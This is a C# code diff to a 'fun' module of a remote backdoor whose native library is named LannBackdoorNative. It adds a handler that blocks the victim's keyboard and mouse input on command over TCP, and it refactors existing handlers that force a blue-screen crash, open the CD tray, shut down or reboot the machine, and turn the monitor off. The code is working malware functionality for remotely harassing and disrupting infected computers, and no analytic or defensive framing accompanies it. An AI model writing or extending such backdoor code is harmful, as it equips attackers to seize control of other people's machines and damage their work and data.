@@ -12,8 +12,11 @@ using SystemModule.Structures;
 namespace FunModule;
 
 [Module("fun")]
-public class FunModuleImpl {
+public class FunModuleImpl : IModule {
     private static readonly Logger Logger = LoggerFactory.CreateLogger("Module", "FileSystem");
+
+    [DllImport("user32.dll", CharSet = CharSet.Auto, ExactSpelling = true)]
+    private static extern bool BlockInput([In] [MarshalAs(UnmanagedType.Bool)] bool fBlockIt);
 
     [DllImport("LannBackdoorNative.dll", CharSet = CharSet.Auto, ExactSpelling = true)]
     private static extern void RaiseBSOD();
@@ -26,14 +29,22 @@ public class FunModuleImpl {
 
     [DllImport("LannBackdoorNative.dll", CharSet = CharSet.Auto, ExactSpelling = true)]
     private static extern void OpenCDRom();
-    
+
+    [Handler("blockInput")]
+    public async Task BlockInputHandler(TCPClient client, BlockInputHandlerData data) {
+        BlockInputResult result = new();
+        BlockInput(data.Enable);
+
+        await Callback(client, "blockInput", result);
+    }
+
     [Handler("bsod")]
-    public static async Task BsodHandler(TCPClient client, EmptyHandlerData data) {
+    public async Task BsodHandler(TCPClient client, EmptyHandlerData data) {
         RaiseBSOD();
     }
-    
+
     [Handler("cdrom")]
-    public static async Task CDRomHandler(TCPClient client, EmptyHandlerData data) {
+    public async Task CDRomHandler(TCPClient client, EmptyHandlerData data) {
         CDRomResult result = new();
         try {
             OpenCDRom();
@@ -42,25 +53,22 @@ public class FunModuleImpl {
             result.Error = error.Message;
             result.Success = false;
         }
-        
-        await client.SendPacket(new ClientPacket {
-            Type = PacketType.Callback,
-            Data = result
-        });
+
+        await Callback(client, "cdrom", result);
     }
-    
+
     [Handler("shutdown")]
-    public static async Task ShutdownHandler(TCPClient client, EmptyHandlerData data) {
+    public async Task ShutdownHandler(TCPClient client, EmptyHandlerData data) {
         ShutdownPC(false);
     }
-    
+
     [Handler("reboot")]
-    public static async Task RebootHandler(TCPClient client, EmptyHandlerData data) {
+    public async Task RebootHandler(TCPClient client, EmptyHandlerData data) {
         ShutdownPC(true);
     }
-    
+
     [Handler("toggleMonitor")]
-    public static async Task ToggleMonitorHandler(TCPClient client, ToggleMonitorHandlerData data) {
+    public async Task ToggleMonitorHandler(TCPClient client, ToggleMonitorHandlerData data) {
         ToggleMonitorResult result = new();
         try {
             ToggleMonitor(data.Enable);
@@ -69,10 +77,7 @@ public class FunModuleImpl {
             result.Error = error.Message;
             result.Success = false;
         }
-        
-        await client.SendPacket(new ClientPacket {
-            Type = PacketType.Callback,
-            Data = result
-        });
+
+        await Callback(client, "toggleMonitor", result);
     }
 }
